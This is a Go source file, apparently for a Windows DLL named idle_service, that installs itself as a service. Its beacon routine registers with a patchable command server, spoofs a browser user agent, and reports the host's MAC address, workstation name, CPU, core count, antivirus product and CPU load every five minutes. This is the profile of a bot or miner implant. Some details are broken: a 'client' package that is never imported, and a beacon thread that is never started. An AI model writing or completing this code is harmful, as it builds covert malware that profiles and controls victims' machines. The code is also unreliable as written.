package main

import (
	"C"
	"log"
	"os"
	"time"

	"github.com/monsun69/idle_service/lib/connector"
	connectorModels "github.com/monsun69/idle_service/lib/connector/models"
	"github.com/monsun69/idle_service/lib/sysinfo/models"
	"github.com/monsun69/idle_service/lib/utils"
	"github.com/monsun69/idle_service/lib/winsvc"
)

var baseUrl = "@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@"
var userAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
var commutateDelay = 300

var c client.Instance
var s models.Main

func commutateThread() {
	c.Init(utils.ParseBaseUrl(baseUrl))
	c.UserAgent = userAgent

	for {
		if _, err := c.Heartbeat(connectorModels.Request_Heartbeat{
			Utilization: s.System.CpuUtil,
			Id:          s.System.Mac,
		}); err != nil {
			c.Register(connectorModels.Request_Register{
				Id:          s.System.Mac,
				Version:     1,
				Workstation: s.System.Workstation,
				Arch:        s.System.Arch,
				Cpu:         s.System.Cpu,
				Cores:       s.System.Cores,
				Av:          s.System.Av,
				Utility:     s.System.CpuUtil,
				Os:          s.System.Os,
			})
		}
		time.Sleep(time.Second * commutateDelay)
	}
}

//export EntryPoint
func EntryPoint() {
	s.Init()
	f, err := os.OpenFile("C:\\idle_svc.log", os.O_RDWR|os.O_CREATE|os.O_APPEND, 0666)
	defer f.Close()
	if err != nil {
		log.Panicf("Error on use log file. CODE: %v\n", err)
	}
	log.SetOutput(f)

	if err := winsvc.OurServiceInit("idle_service"); err != 0 {
		log.Panicf("Error on service initialization. CODE: %v\n", err)
	}

	for {
		time.Sleep(time.Second * 30)
		log.Printf("Idle service is alive.")
	}
}

func main() {
}
